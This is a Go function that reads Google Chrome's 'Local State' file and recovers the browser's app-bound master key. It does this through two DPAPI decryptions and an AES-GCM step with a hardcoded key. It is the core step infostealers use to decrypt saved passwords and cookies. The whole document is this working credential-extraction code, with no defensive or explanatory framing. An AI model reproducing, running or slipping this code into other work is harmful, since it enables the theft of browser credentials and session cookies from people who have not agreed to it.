func decryptChromeKey() ([]byte, error) {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		return nil, fmt.Errorf("USERPROFILE environment variable not set")
	}

	localStatePath := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State: %v", err)
	}

	var localState LocalState
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, fmt.Errorf("failed to parse Local State: %v", err)
	}

	app_bound_encrypted_key := localState.OSCrypt.AppBoundEncryptedKey
	if app_bound_encrypted_key == "" {
		return nil, fmt.Errorf("no encrypted key found in Local State")
	}

	decoded, err := base64.StdEncoding.DecodeString(app_bound_encrypted_key)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encrypted key: %v", err)
	}

	if string(decoded[:4]) != "APPB" {
		return nil, fmt.Errorf("invalid key prefix")
	}

	decrypted1, err := dpapi_decrypt(decoded[4:], true)
	if err != nil {
		return nil, fmt.Errorf("first DPAPI decrypt failed: %v", err)
	}

	decrypted2, err := dpapi_decrypt(decrypted1, false)
	if err != nil {
		return nil, fmt.Errorf("second DPAPI decrypt failed: %v", err)
	}

	if len(decrypted2) < 61 {
		return nil, fmt.Errorf("decrypted key too short, got %d bytes", len(decrypted2))
	}
	decrypted_key := decrypted2[len(decrypted2)-61:]

	if decrypted_key[0] != 1 {
		return nil, fmt.Errorf("invalid key format")
	}

	aes_key, err := base64.StdEncoding.DecodeString("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
	if err != nil {
		return nil, fmt.Errorf("failed to decode AES key: %v", err)
	}

	iv := decrypted_key[1 : 1+12]
	ciphertext := decrypted_key[1+12 : 1+12+32]
	tag := decrypted_key[1+12+32:]

	block, err := aes.NewCipher(aes_key)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %v", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}

	key, err := aesGCM.Open(nil, iv, append(ciphertext, tag...), nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt key: %v", err)
	}

	return key, nil
}